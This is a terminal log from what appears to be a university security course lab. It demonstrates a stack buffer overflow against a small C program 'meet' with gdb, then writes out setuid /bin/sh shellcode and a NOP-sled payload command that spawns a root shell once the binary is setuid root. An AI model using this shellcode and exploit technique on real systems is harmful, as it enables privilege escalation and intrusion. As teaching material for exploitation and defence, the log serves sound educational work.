  ebp at 0xbffff42c, eip at 0xbffff430
(gdb) n
9		strcpy(name, temp1);
(gdb) n
10		printf( "Hi %s\n", name );
(gdb) n
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
11	}
(gdb) info frame
Stack level 0, frame at 0xbffff434:
 eip = 0x80484e0 in greeting (meet.c:11); saved eip = 0x80484f4
 called by frame at 0xbffff408
 source language c.
 Arglist at 0xbffff42c, args: temp1=0xbffff62b 'A' <repeats 200 times>...
 Locals at 0xbffff42c, Previous frame's sp is 0xbffff434
 Saved registers:
  ebp at 0xbffff42c, eip at 0xbffff430
(gdb) n
main (argc=1094795585, argv=0x41414141) at meet.c:17
17		printf( "Bye \n" );
(gdb) info frame
Stack level 0, frame at 0xbffff408:
 eip = 0x80484f7 in main (meet.c:17); saved eip = 0x41414141
 source language c.
 Arglist at 0xbffff400, args: argc=1094795585, argv=0x41414141
 Locals at 0xbffff400, Previous frame's sp is 0xbffff408
 Saved registers:
  ebp at 0xbffff400, eip at 0xbffff404
(gdb) n
Bye 
18	}
(gdb) n
_dl_fixup (l=0x0, reloc_arg=3086731376) at dl-runtime.c:72
72	dl-runtime.c: No such file or directory.
(gdb) n
69	in dl-runtime.c
(gdb) n

Program received signal SIGSEGV, Segmentation fault.
_dl_fixup (l=0x0, reloc_arg=3086731376) at dl-runtime.c:69
69	in dl-runtime.c
(gdb) n

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) n
The program is not being run.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ meet "Ananya"
No command 'meet' found, did you mean:
 Command 'melt' from package 'melt' (universe)
 Command 'eet' from package 'libeet-bin' (universe)
 Command 'peet' from package 'pipexec' (universe)
 Command 'beet' from package 'beets' (universe)
 Command 'meep' from package 'meep' (universe)
meet: command not found
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet "Ananya"
Hi Ananya
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e '^C
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ perl -e 'print "\ x31\ xc0 \ x31 \ xdb \ xb0 \ x17 \xcd\ x80\ xeb \ x1f \ x5e \ x89 \x76 \x08\ x31\ xc0 \ x88 \ x46
> \ x07 \ x89 \x46 \x0c\ xb0 \ x0b \ x89 \ xf3 \ x8d \x4e \x08\ x8d \ x56 \ x0c \ xcd \ x80 \x31 \xdb\ x89 \ xd8 \ x40 \ xcd
> \ x80 \ xe8 \xdc \xff\ xff \ xff / bin /sh";' > sc
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ hexdump sc
0000000 7820 3133 7820 3063 2020 3378 2031 7820
0000010 6264 2020 6278 2030 7820 3731 cd20 7820
0000020 3038 7820 6265 2020 3178 2066 7820 6535
0000030 2020 3878 2039 2076 2008 3378 2031 6378
0000040 2030 7820 3838 2020 3478 0a36 7820 3730
0000050 2020 3878 2039 2046 200c 6278 2030 7820
0000060 6230 2020 3878 2039 7820 3366 2020 3878
0000070 2064 204e 2008 3878 2064 7820 3635 2020
0000080 3078 2063 7820 6463 2020 3878 2030 2031
0000090 20db 3878 2039 7820 3864 2020 3478 2030
00000a0 7820 6463 200a 3878 2030 7820 3865 dc20
00000b0 ff20 7820 6666 2020 6678 2066 202f 6962
00000c0 206e 732f 0068                         
00000c5
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc`` perl -e 'print "\xf8\xf2\xff\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ perl -e 'print "\ x31\ xc0 \ x31 \ xdb \ xb0 \ x17 \xcd\ x80\ xeb \ x1f \ x5e \ x89 \x76 \x08\ x31\ xc0 \ x88 \ x46
\ x07 \ x89 \x46 \x0c\ xb0 \ x0b \ x89 \ xf3 \ x8d \x4e \x08\ x8d \ x56 \ x0c \ xcd \ x80 \x31 \xdb\ x89 \ xd8 \ x40 \ xcd
\ x80 \ xe8 \xdc \xff\ xff \ xff / bin ^Ch";' > sc
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ perl -e 'print "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46 \x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd \x80\xe8\xdc\xff\xff\xff/bin/sh";' > sc
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ hexdump sc
0000000 c031 db31 17b0 80cd 1feb 895e 0876 c031
0000010 4688 0720 4689 b00c 890b 8df3 084e 568d
0000020 cd0c 3180 89db 40d8 20cd e880 ffdc ffff
0000030 622f 6e69 732f 0068                    
0000037
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc`` perl -e 'print "\xf8\xf2\xff\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc``perl -e 'print"\xf8\xf2\xff\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"\xf8\xf2\xff\xbf"x38';`
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x202';``cat sc``perl -e 'print"\xf8\xf2\xff\xbf"x38';`
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x201';``cat sc``perl -e 'print"\xf8\xf2\xff\xbf"x38';`
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc``perl -e 'print"\xf8\xf2\xff\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x204';``cat sc``perl -e 'print"\xf8\xf2\xff\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x205';``cat sc``perl -e 'print"\xf8\xf2\xff\xbf"x38';`
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x206';``cat sc``perl -e 'print"\xf8\xf2\xff\xbf"x38';`
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector get_sp.c -o get_sp
get_sp.c: In function ‘main’:
get_sp.c:10:9: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long unsigned int’ [-Wformat=]
  printf("Stack pointer (ESP): 0x%x\n", get_sp() );
         ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbffff5f0
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x205';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x204';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x202';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x201';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbffff5f0
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"^C8';`
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ^C
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ rm sc
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls ..
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls ../..
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls ../../demo
get_sp  get_sp.c  meet  meet.c  meet_orig  meet_orig.c  sc
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ cp ../../demo/sc .
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                        ?
                                                         ???V
                                                             ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x201';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                         ?
                                                          ???V
                                                              ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x202';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                          ?
                                                           ???V
                                                               ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                           ?
                                                            ???V
                                                                ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
$ whoami
student
$ su root
Password: 
su: Authentication failure
$ q
/bin/sh: 3: q: not found
$ exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls -la
total 48
drwxr-xr-x 2 student student 4096 Nov 26 12:00 .
drwxr-xr-x 6 student student 4096 Nov 26 10:49 ..
-rwxrwxr-x 1 student student 8316 Nov 26 11:39 get_sp
-rw-r--r-- 1 student student  150 Nov 26 10:49 get_sp.c
-rwxrwxr-x 1 student student 8588 Nov 26 10:58 meet
-rw-r--r-- 1 student student  242 Nov 26 10:49 meet.c
-rw-rw-r-- 1 student student   53 Nov 26 12:00 sc
-rw-r--r-- 1 student student  148 Nov 26 10:49 simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ sudo chown root:root meet
[sudo] password for student: 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ sudo chmod u+s meet
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                           ?
                                                            ???V
                                                                ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
# woami
/bin/sh: 1: woami: not found
# whoami
root
# exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ cd ..
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd target
-bash: cd: target: No such file or directory
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd targets
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cat Makefile 
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls -la
total 92
drwxr-xr-x 2 student student 4096 Nov 26 10:49 .
drwxr-xr-x 6 student student 4096 Nov 26 10:49 ..
-rw-r--r-- 1 student student  697 Nov 26 10:49 Makefile
-rwxr-xr-x 1 root    root    8580 Nov 26 10:49 target0
-rw-r--r-- 1 student student  259 Nov 26 10:49 target0.c
-rwxr-xr-x 1 root    root    9748 Nov 26 10:49 target1
-rw-r--r-- 1 student student  297 Nov 26 10:49 target1.c
-rwxr-xr-x 1 root    root    9964 Nov 26 10:49 target2
-rw-r--r-- 1 student student  734 Nov 26 10:49 target2.c
-rwxr-xr-x 1 root    root    9852 Nov 26 10:49 target3
-rw-r--r-- 1 student student  394 Nov 26 10:49 target3.c
-rwxr-xr-x 1 root    root    9744 Nov 26 10:49 target4
-rw-r--r-- 1 student student  292 Nov 26 10:49 target4.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls -la ../demo
total 48
drwxr-xr-x 2 student student 4096 Nov 26 12:00 .
drwxr-xr-x 6 student student 4096 Nov 26 10:49 ..
-rwxrwxr-x 1 student student 8316 Nov 26 11:39 get_sp
-rw-r--r-- 1 student student  150 Nov 26 10:49 get_sp.c
-rwsrwxr-x 1 root    root    8588 Nov 26 10:58 meet
-rw-r--r-- 1 student student  242 Nov 26 10:49 meet.c
-rw-rw-r-- 1 student student   53 Nov 26 12:00 sc
-rw-r--r-- 1 student student  148 Nov 26 10:49 simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cat target0
ELFp4? 	($!444  TT ??hhhDDP?td???44Q?tdR??/lib/ld-linux.so.2GNU GNU8<W??m??_xj?0??j  ?K??!A /(
              llibc.so.6_IO_stdin_usedstrcpyprintfmemset__libc_start_main__gmon_P??rt__GLIBC_2.0ii
  S????
       ????????t?V?[??5??%
                          h??????%??????%h??????%h?????%?f?1?^????PTRhPh?QVh??????f?f?f?f?f?f?f??$?f?f?f?f?f?f??'-$??v???tU???h$?Ѓ???Ð?t&?$-$?????????t??tU???Ph$?҃???Ít&??'?=$uU???|????$???f?????u듍v???t?U???P?҃???u???U???h?j??p???P???????
                                                                             ???p???P???????p???Php?s???????U??E
                                ???P???????E
                                            ???Phw?F???????f?f?f?f?f?f?UWVS???????
  ?l$ ??
        ????????????)?????t%1??????t$,?t$,U?????????9?u??
                                                         [^_]Ív??S??C????ã?[?Hi %s
Bye %s
0????L????p3????p?????????zR|
                             <???F
                                  J
D?                                 tx?;*2$"@s???H?B
m?`????1?B
  H?????]?A
           ?A?A?N i$D(D,A0M GA?A?
                                 AA??????@ ?
??                                         ?
???o?<́?
Z
???o????o???o?&6FVGCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609ky?
                                                                         ??ky?????ix?}kH???r?x???x?	k?
?O?1???O???r%


             >
              $

               >


               I.?:
                   ;
                    '@?B:
                         ;
                          I4:
                             ;
                              I	!I/
.?:
   ;
target0.ck=?long long intGNU C11 5.4.0 20160609 -mpreferred-stack-boundary=2 -mtune=generic -march=i686 -ggdb -fno-stack-protectornamegreeting/home/student/cs5435-fa19-hw4/targetstarget0.cunsigned charmainlong long unsigned intargcshort unsigned inttemp1short intsizetypeargvTh?<?Ă?      ̂
?
?
pTh???
    ?$??
        ?. D$S
              z@???????????
                           ???? P/ K?? as$)Tz??kH? ? ?l???]??(?p?
                                                                h$?1$ 8$D ??
                                                                           crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.7209__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrytarget0.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable__x86.get_pc_thunk.bxprintf@@GLIBC_2.0_edatastrcpy@@GLIBC_2.0__data_startgreeting__gmon_start____dso_handle_IO_stdin_used__libc_start_main@@GLIBC_2.0__libc_csu_initmemset@@GLIBC_2.0_fp_hw__bss_startmain_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment.debug_aranges.debug_info.debug_abbrev.debug_line.debug_strT#hh 1??$D???o?? N
                                                                             ?pV<<Z^???o??k???o?? z    ??       ???#?P??pp??TT?hh???4?????
                                                         ?
                                                         ??????$$0$5
Y y%y?3D?0V?Jl?#4	<^student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cat target0.c
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls ../sploits/
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cat ../sploits/sploit0.c 
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  args[1] = "student"; 
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc - ggdb - mpreferred - stack - boundary =2 - zexecstack -fno - stack - protector sploit0.c -o sploit0
gcc: error: ggdb: No such file or directory
gcc: error: mpreferred: No such file or directory
gcc: error: stack: No such file or directory
gcc: error: boundary: No such file or directory
gcc: error: =2: No such file or directory
gcc: error: zexecstack: No such file or directory
gcc: error: stack: No such file or directory
gcc: error: protector: No such file or directory
gcc: error: unrecognized command line option ‘-fno’
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0.c  sploit2.c  sploit4.c
sploit0      sploit1.c  sploit3.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi student
Bye student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ exit
logout
There are stopped jobs.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ exit
logout
Exception ignored in: <gdb.GdbOutputFile object at 0xb72dcfec>
Traceback (most recent call last):
  File "/usr/share/gdb/python/gdb/__init__.py", line 43, in flush
    def flush(self):
KeyboardInterrupt
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

Last login: Tue Nov 26 10:47:28 2019 from 10.0.2.2
student@5435-hw4-vm:~$ lw
lw: command not found
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd demo
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"\xf0\xf2\xff\xbf"x38';`
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbf854d00
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"\x00\x3d\x85\xbf"x38';`
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x201';``cat sc``perl -e 'print"\x00\x3d\x85\xbf"x38';`
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
 ?
  ???V
      ̀1ۉ?@̀?????/bin/sh=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x202';``cat sc``perl -e 'print"\x00\x3d\x85\xbf"x38';`
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc``perl -e 'print"\x00\x3d\x85\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
   ̀1ۉ?@̀?????/bin/sh=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??=??
Bye 
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbf86f770
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./meet `perl -e 'print "\x90"x200';``cat sc``perl -e 'print"\x70\xf4\x86\xbf"x38';`
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
